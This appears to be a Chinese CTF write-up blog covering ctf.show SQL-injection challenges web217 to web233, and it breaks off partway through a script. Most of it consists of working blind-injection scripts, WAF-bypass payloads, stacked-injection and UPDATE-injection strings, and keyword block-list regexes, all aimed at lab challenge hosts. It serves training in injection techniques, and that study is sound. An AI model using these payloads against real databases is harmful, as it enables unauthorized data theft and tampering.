<pre class="language-python" data-language="python"><code class="language-python">#@Auth：Sentiment
import requests
import time
url&#x3D;&quot;http:&#x2F;&#x2F;f563ebb3-cced-467b-b970-59f54fb5c9a0.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;
flag&#x3D;&#39;&#39;
for i in range(50):
    m&#x3D;32
    n&#x3D;127
    while 1:
        mid&#x3D;(m+n)&#x2F;&#x2F;2
        data&#x3D;&#123;
        #&#39;ip&#39;:&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #ctfshow_flagxccb,ctfshow_info
        #&#39;ip&#39;:&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxccb&#39;),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #id,flagaabc,info
        &#39;ip&#39;:&quot;if(ascii(substr((select flagaabc from ctfshow_flagxccb),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #ctfshow&#123;d0ec2f99-1463-480a-b2d0-f5bb3d464411&#125;
        &#125;
        #print(data)
        try:
           r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.5)
           m&#x3D;mid
        except:
            n&#x3D;mid
        if(m+1&#x3D;&#x3D;n):
            flag+&#x3D;chr(m)
            print(flag)
            break
        time.sleep(0.2)
    time.sleep(1)</code></pre>

<h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><pre class="language-none"><code class="language-none">function waf($str)&#123;
    return preg_match(&#39;&#x2F;sleep|benchmark&#x2F;i&#39;,$str);
&#125;   </code></pre>

<p>benchmark也被过滤了</p>
<p>参考一下这两个</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/13019703.html">https://www.cnblogs.com/forforever/p/13019703.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5505">SQL注入有趣姿势总结 - 先知社区 (aliyun.com)</a></p>
<p>1.sleep</p>
<p>2.benchmark</p>
<p>3.笛卡尔积</p>
<p>4.GET_LOCK() 加锁</p>
<p>5.RLIKE REGEXP正则匹配</p>
<p>使用rpad或者repeat构造长字符串，利用正则表达式控制延时</p>
<pre class="language-none"><code class="language-none">mysql&gt; select * from ctftable where if((concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;),1,1);
+----+-------+--------+
| id | user  | passwd |
+----+-------+--------+
|  1 | admin | passwd |
|  2 | user  | pass   |
|  3 | Lxxx  | 123456 |
+----+-------+--------+
3 rows in set (3.63 sec)</code></pre>

<pre class="language-python" data-language="python"><code class="language-python">import time
import requests
url &#x3D; &#39;http:&#x2F;&#x2F;3471a536-3547-4d4b-93c6-06020fab5ffe.challenge.ctf.show&#x2F;api&#x2F;index.php&#39;
flag &#x3D; &#39;&#39;
sleep_rep &#x3D; &quot;concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) rlike &#39;(a.*)+(a.*)+b&#39;&quot;

for i in range(60):
    lenth &#x3D; len(flag)
    min,max &#x3D; 32,128
    while True:
        j &#x3D; min + (max-min)&#x2F;&#x2F;2
        if(min &#x3D;&#x3D; j):
            flag +&#x3D; chr(j)
            print(flag)
            break

        payload &#x3D; &#123;&quot;ip&quot;:f&quot;&#39;&#39;) or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;i&#125;,1))&lt;&#123;j&#125;,&#123;sleep_rep&#125;,&#39;False&#39;)#&quot;
                   ,&#39;debug&#39;:0&#125;

        try:
            r &#x3D; requests.post(url&#x3D;url,data&#x3D;payload,timeout&#x3D;0.5)
            min &#x3D; j
        except:
            max &#x3D; j
        time.sleep(0.2)
</code></pre>

<h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><pre><code>//屏蔽危险分子
function waf($str)&#123;
    return preg_match(&#39;/sleep|benchmark|rlike/i&#39;,$str);
&#125;   
</code></pre>
<p>rlike也被过滤了，尝试用笛卡儿积</p>
<pre class="language-none"><code class="language-none">笛卡尔积(因为连接表是一个很耗时的操作)
AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表
SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
select * from table_name A, table_name B
select * from table_name A, table_name B，table_name C
select count(*) from table_name A, table_name B，table_name C  表可以是同一张表</code></pre>

<p>Lxxx师傅的测试：</p>
<pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B;
+----------+
| count(*) |
+----------+
| 62805625 |
+----------+
1 row in set (1.74 sec)</code></pre>

<pre class="language-python" data-language="python"><code class="language-python">import requests
import time
url&#x3D;&#39;http:&#x2F;&#x2F;f6ad04f0-3fd9-4eb9-9dc9-78cfaa9f5000.challenge.ctf.show&#x2F;api&#x2F;index.php&#39;

flag&#x3D;&#39;&#39;
for i in range(60):
    lenth &#x3D; len(flag)
    min,max &#x3D; 32,128
    while True:
        j &#x3D; min + (max-min)&#x2F;&#x2F;2
        if(min &#x3D;&#x3D; j):
            flag +&#x3D; chr(j)
            print(flag)
            break

        # payload&#x3D;f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;
        # payload&#x3D;f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxca&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;
        payload&#x3D;f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;

        data&#x3D;&#123;
            &#39;ip&#39;:payload,
            &#39;debug&#39;:0
        &#125;
        try:
            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.15)
            min&#x3D;j
        except:
            max&#x3D;j
        time.sleep(0.1)
</code></pre>

<h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><pre><code>//屏蔽危险分子
function waf($str)&#123;
    return preg_match(&#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#39;,$str);
&#125;   
</code></pre>
<p>payload同上</p>
<p>或者</p>
<p>过滤ascii和substr可以用like代替,在构造 payload 的时候使用 limit 限制查询条数，从而绕过 concat 的限制,在上题exp基础上修改一下即可</p>
<pre class="language-python" data-language="python"><code class="language-python">#@Auth：Sentiment
import requests
import time as t
url&#x3D;&#39;http:&#x2F;&#x2F;b25594e9-ab57-43ce-a255-7b87f771b72a.challenge.ctf.show&#x2F;api&#x2F;index.php&#39;
flag&#x3D;&#39;ctfshow&#123;&#39;
for i in range(1,50):
    for j in &#39;abcdefghijklmnopqrstuvwxyz1234567890-_&#123;&#125;&#39;:
        data&#x3D;&#123;
        #&#39;ip&#39;:&quot;if((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; # ctfshow_flagxcac
        #&#39;ip&#39;:&quot;if((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxcac&#39; limit 1,1) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; # flagaabcc
        &#39;ip&#39;:&quot;if((select flagaabcc from ctfshow_flagxcac) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; #ctfshow&#123;e97ffaa2-9de8-4b3d-a623-1a09ad9eeb83&#125;
        &#125;
        print(data)
        try:
           r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.15)

        except:
            flag+&#x3D;j
            print(flag)
            break
        t.sleep(0.3)
</code></pre>

<h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><p>盲注终于结束了，尤其是时间盲注，感觉又费时又费力。</p>
<blockquote>
<p>limit注入</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询
$sql &#x3D; select * from ctfshow_user limit ($page-1)*$limit,$limit;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:很安全，不需要过滤
&#x2F;&#x2F;拿到数据库名字就算你赢
      </code></pre>

<p>看一下这个查询语句</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">select * from tableName limit i,n
# tableName：表名
# i：为查询结果的索引值(默认从0开始)，当i&#x3D;0时可省略i
# n：为查询结果返回的数量
# i与n之间使用英文逗号&quot;,&quot;隔开
#limit n 等同于 limit 0,n</code></pre>

<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p>
<p>p牛的文章</p>
<p>里面写道</p>
<blockquote>
<p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，那么使用PROCEDURE函数能否注入呢</p>
</blockquote>
<p>那肯定是能注入的</p>
<p>下面是p牛的尝试过程</p>
<pre class="language-none"><code class="language-none">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1); 

ERROR 1386 (HY000): Can&#39;t use ORDER clause with this procedure</code></pre>

<p>ANALYSE可以有两个参数：</p>
<pre class="language-none"><code class="language-none">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1,1); 

ERROR 1386 (HY000): Can&#39;t use ORDER clause with this procedure</code></pre>

<p>看起来并不是很好，继续尝试：</p>
<pre class="language-none"><code class="language-none">mysql&gt; SELECT field from table where id &gt; 0 order by id LIMIT 1,1 procedure analyse((select IF(MID(version(),1,1) LIKE 5, sleep(5),1)),1);</code></pre>

<p>但是立即返回了一个错误信息： </p>
<pre class="language-none"><code class="language-none">ERROR 1108 (HY000): Incorrect parameters to procedure &#39;analyse&#39;</code></pre>

<p>sleep函数肯定没有执行，但是最终我还是找到了可以攻击的方式： </p>
<pre class="language-none"><code class="language-none">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 

ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.41-0ubuntu0.14.04.1&#39;</code></pre>

<p>如果不支持报错注入的话，还可以基于时间注入：</p>
<pre class="language-none"><code class="language-none">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre>

<p>直接使用sleep不行，需要用BENCHMARK代替。 </p>
<p>可以看到这里是利用了报错的方式注出了内容</p>
<p>适用范围 5.0.0&lt; MySQL &lt;5.6.6</p>
<p>而这道题里也开启了报错</p>
<p>当没有id这一参数时</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511133031946.png" alt="image-20220511133031946"></p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))),1)</code></pre>

<p>不知道为什么出不来数据（虽说只要注到库名就行</p>
<h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><blockquote>
<p>group 注入</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询
$sql &#x3D; select * from ctfshow_user group by $username;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:很安全，不需要过滤
      </code></pre>

<p>参数在group后边</p>
<p>group by可用于时间盲注,举个例子：</p>
<pre class="language-none"><code class="language-none">select * from users group by 1,if(1&#x3D;1,sleep(0.5),1);
1</code></pre>

<p>查询每一行时都需要执行sleep,我有5行数据所以需要大约5*0.5秒=2.5秒左右的时间</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import time
url&#x3D;&#39;http:&#x2F;&#x2F;9f4a1dc4-86c8-4876-b732-f5ffd6be8114.challenge.ctf.show&#x2F;api&#x2F;index.php?u&#x3D;&#39;

flag&#x3D;&#39;&#39;
for i in range(1,100):
    min&#x3D;32
    max&#x3D;128
    while 1:
        j&#x3D;min+(max-min)&#x2F;&#x2F;2
        if min&#x3D;&#x3D;j:
            flag+&#x3D;chr(j)
            print(flag)
            break

        #payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;
        #payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flaga&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;
        payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;

        try:
            r&#x3D;requests.get(url&#x3D;url+payload,timeout&#x3D;0.4)
            min&#x3D;j
        except:
            max&#x3D;j
        time.sleep(0.2)
</code></pre>

<p>这里我们可以试一下group by常规的报错语句</p>
<pre class="language-none"><code class="language-none">select count(*) from users group by concat(database(),floor(rand(0)*2));</code></pre>

<p>发现能查出东西，那我们也可以利用布尔盲注</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import time

url&#x3D;&#39;http:&#x2F;&#x2F;60eb33c3-f99f-40ab-a612-d0085affb66a.challenge.ctf.show&#x2F;api&#x2F;index.php?u&#x3D;&#39;

flag&#x3D;&#39;&#39;
for i in range(1,100):
    min&#x3D;32
    max&#x3D;128
    while 1:
        j&#x3D;min+(max-min)&#x2F;&#x2F;2
        if min&#x3D;&#x3D;j:
            flag+&#x3D;chr(j)
            print(flag)
            break

        #payload&#x3D;f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot;
        #payload&#x3D;f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flaga&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot;
        payload&#x3D;f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot;

        r&#x3D;requests.get(url&#x3D;url+payload).text
        #print(r.text)
        if len(r)&lt;288:
            max&#x3D;j
        else:
            min&#x3D;j
</code></pre>

<h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><p>还是group注入</p>
<p>但是 过滤了数字，也就是说用substr之类的函数不能直接用了</p>
<p>但是经过测试还是能够盲注</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511141529576.png" alt="image-20220511141529576"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511141551392.png" alt="image-20220511141551392"></p>
<p>看出返回值不同，而数字可以利用web185里提到的true代替</p>
<pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;
import requests


def generateNum(num):
    res &#x3D; &#39;true&#39;
    if num &#x3D;&#x3D; 1:
        return res
    else:
        for i in range(num - 1):
            res +&#x3D; &quot;+true&quot;
        return res


url &#x3D; &quot;http:&#x2F;&#x2F;ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show&#x2F;api&#x2F;&quot;
i &#x3D; 0
res &#x3D; &quot;&quot;
while 1:
    head &#x3D; 32
    tail &#x3D; 127
    i &#x3D; i + 1

    while head &lt; tail:
        mid &#x3D; (head + tail) &gt;&gt; 1
        # 查数据库-ctfshow_flagas
        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;
        # 查字段-flagasabc
        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagas&#39;&quot;
        # 查flag
        payload &#x3D; &quot;select flagasabc from ctfshow_flagas&quot;
        params &#x3D; &#123;
            &quot;u&quot;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;generateNum(i)&#125;,&#123;generateNum(1)&#125;))&gt;&#123;generateNum(mid)&#125;,username,&#39;a&#39;)&quot;
        &#125;
        r &#x3D; requests.get(url, params&#x3D;params)
        # print(r.json()[&#39;data&#39;])
        if &quot;userAUTO&quot; in r.text:
            head &#x3D; mid + 1
        else:
            tail &#x3D; mid
    if head !&#x3D; 32:
        res +&#x3D; chr(head)
    else:
        break
    print(res)</code></pre>

<h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>在robots.txt里找到一个重置密码的页面，重置之后直接登录，看到文件上传的页面</p>
<p>然后试了试，怎么感觉什么也传不上去</p>
<p>ctfshow的群里有个payload.bin把这个传上去之后就直接生成了一个木马</p>
<p>访问1.php命令执行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511143349476.png" alt="image-20220511143349476"></p>
<p>原理看这个</p>
<p><a target="_blank" rel="noopener" href="https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5">https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5</a></p>
<h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询
$sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;师傅说过滤的越多越好
if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set&#x2F;i&#39;,$username))&#123;
  die(json_encode($ret));
&#125;
    </code></pre>

<p>题目提示是堆叠注入了</p>
<p>select被过滤了，利用常规的堆叠注入</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511150345663.png" alt="image-20220511150345663"></p>
<p>只能查到这了</p>
<p>和强网杯那道差不多</p>
<p>先让我们看看强网杯的payload</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">方法一 使用rename和alter
1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#
方法二 使用handler
0&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;#
方法三 使用预处理语句
0&#39;;set @sql&#x3D;concat(&#39;sele&#39;,&#39;ct &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 from @sql;EXECUTE stmt1;#
</code></pre>

<p>而这道题alter被过滤了，所以可以利用预处理，或者是handler</p>
<p>又因为过滤了set，方法三所以直接写语句就行</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107823398">https://blog.csdn.net/solitudi/article/details/107823398</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/108583338">(4条消息) 攻防世界-Web高手进阶区-supersqli(强网杯的随便注)_rfrder的博客-CSDN博客</a></p>
<h3 id="预处理SQL"><a href="#预处理SQL" class="headerlink" title="预处理SQL"></a>预处理SQL</h3><p>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。<br>简单用法：</p>
<p>使用方法<br>MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。</p>
<pre class="language-none"><code class="language-none">PREPARE name from &#39;[my sql sequece]&#39;;   &#x2F;&#x2F;预定义SQL语句
EXECUTE name;  &#x2F;&#x2F;执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  &#x2F;&#x2F;删除预定义SQL语句</code></pre>

<p>字符串定义预处理</p>
<pre class="language-none"><code class="language-none">PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;
ET @a &#x3D; 3;
SET @b &#x3D; 4;                                                   
EXECUTE stmt1 USING @a, @b;</code></pre>

<p>变量定义预处理 SQL</p>
<pre class="language-none"><code class="language-none">SET @s &#x3D; &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;
PREPARE stmt2 FROM @s;
SET @c &#x3D; 6;
ET @d &#x3D; 8;
EXECUTE stmt2 USING @c, @d;
DEALLOCATE PREPARE stmt2;
</code></pre>

<p>在这道题里就是这样的</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;;prepare Sentiment from concat(char(115,101,108,101,99,116),&#39;* from ctfshow_flagasa&#39;);execute Sentiment;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511151309635.png" alt="image-20220511151309635"></p>
<h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
<p>payload</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">ctfshow&#39;;handler &#96;ctfshow_flagasa&#96; open;handler &#96;ctfshow_flagasa&#96; read first;--+</code></pre>

<h2 id="web226、228、229、230"><a href="#web226、228、229、230" class="headerlink" title="web226、228、229、230"></a>web226、228、229、230</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询
$sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;师傅说过滤的越多越好
if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(&#x2F;i&#39;,$username))&#123;
  die(json_encode($ret));
&#125;</code></pre>

<p>show被过滤了，那handle就用不了了，因为不能直接show tables看表名，所以只能利用预处理了</p>
<p>转十六进制就行</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">&#39;;prepare a from 0x73686f77207461626c6573;execute a;#</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511152014805.png" alt="image-20220511152014805"></p>
<pre class="language-sql" data-language="sql"><code class="language-sql">&#39;;prepare a from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute a;#</code></pre>



<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511152050147.png" alt="image-20220511152050147"></p>
<p>当然，要是想预处理查出表名之后再用handler也不是不行（</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511152314670.png" alt="image-20220511152314670"></p>
<h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p>表里没flag</p>
<p>这道题考点其实是<code>查看MySQL的存储过程</code><br>看看网上这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a><br>我们去查<code>information_schema.routines</code>表</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511163703317.png" alt="image-20220511163703317"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511163652949.png" alt="image-20220511163652949"></p>
<h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><blockquote>
<p>update注入</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询
$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤</code></pre>

<p>可以看见这里就不是查询语句，而是用update来更新</p>
<blockquote>
<p>update更新数据</p>
</blockquote>
<p>注入点是api的password和username，都是传POST</p>
<p>可以通过闭合password,在第一个注入点执行where条件查询语句,并将后边的where闭合掉(注入点/api/ post传参username,password),或者是利用时间盲注</p>
<p>当我们POST一个password=user&#39;,username=database()#&amp;username=1</p>
<p>刷新一下那个查询界面，就会发现，都变成了ctfshow_web</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511172837773.png" alt="image-20220511172837773"></p>
<p>因为这时候的语句为</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; &#39;user&#39;,username&#x3D;database()#&amp;username&#x3D;1&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;</code></pre>

<p>也就是</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; &#39;user&#39;,username&#x3D;database()</code></pre>

<p>将database()覆盖了username原来的数据，实现了sql注入</p>
<p>然后就是查表查列名查flag了</p>
<p>payload</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;user&#39;,username&#x3D;(select flagas from flaga) where 1&#x3D;1#&amp;username&#x3D;1</code></pre>

<h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询
$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; md5(&#39;&#123;$password&#125;&#39;) where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤</code></pre>

<p>password经过了md5加密</p>
<p>但是我们可以尝试闭合md5函数，实现逃逸</p>
<p>比如输入</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;1&#39;),username&#x3D;database()#&amp;username&#x3D;1</code></pre>

<p>然后整个语句变为</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; md5(&#39;1&#39;),username&#x3D;database()#&#39;) where username &#x3D; &#39;1&#39;;&quot;;</code></pre>

<p>也就是</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; md5(&#39;1&#39;),username&#x3D;database()</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511174011548.png" alt="image-20220511174011548"></p>
<p>后边就和web231一样了</p>
<h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>和231一样的代码，也没过滤，就是不给回显了</p>
<p>用这个测一下发现能时间盲注</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;1&#39; or if(1&#x3D;1,sleep(0.02),0)#&amp;password&#x3D;1</code></pre>



<pre class="language-none"><code class="language-none">import requests
import time

url&#x3D;&#39;http:&#x2F;&#x2F;7cf24fdd-904d-48f6-81ac-0b88a27076ca.challenge.ctf.show&#x2F;api&#x2F;&#39;

flag&#x3D;&#39;&#39;
for i in range(60):
    min&#x3D;32
    max&#x3D;128
    while 1:
        j&#x3D;min+(max-min)&#x2F;&#x2F;2
        if min&#x3D;&#x3D;j:
            flag+&#x3D;chr(j)
            print(flag)
            break

